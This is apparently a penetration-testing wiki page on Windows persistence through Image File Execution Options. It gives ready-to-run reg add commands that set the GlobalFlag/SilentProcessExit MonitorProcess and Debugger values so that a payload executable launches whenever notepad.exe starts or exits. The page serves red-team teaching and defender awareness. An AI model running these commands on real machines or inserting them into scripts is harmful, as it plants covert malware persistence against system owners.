# Image File Execution Options

## Theory

Image File Execution Options is a Windows registry key which enables developers to attach a debugger to an application and to enable “**GlobalFlag**” for application debugging. This behavior of Windows opens the door for persistence since an arbitrary executable can be used as a debugger of a specific process or as a “**MonitorProcess**“. \
In both scenarios code execution will achieved and the trigger will be either the creation of a process or the exit of an application. However it should be noted that the implementation of this technique requires Administrator level privileges as the registry location which the keys needs to be added is under **HKLM**

## Practice

{% tabs %}
{% tab title="GlobalFlag" %}
With the GlobalFlag persistence technique, payload is triggered when the target application is closed.

```powershell
#Enables the silent exit monitoring for the notepad process.
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512

#Enables the Windows Error Reporting process (WerFault.exe) which will be the parent process of the “MonitorProcess”
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1

#Set up the arbitrary payload
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\payload.exe"
```
{% endtab %}

{% tab title="Debugger" %}
Using the debugger technique, we can define a binary that will be attached to the targeted process

```powershell
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /d "C:\tmp\payload.exe"
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/" %}
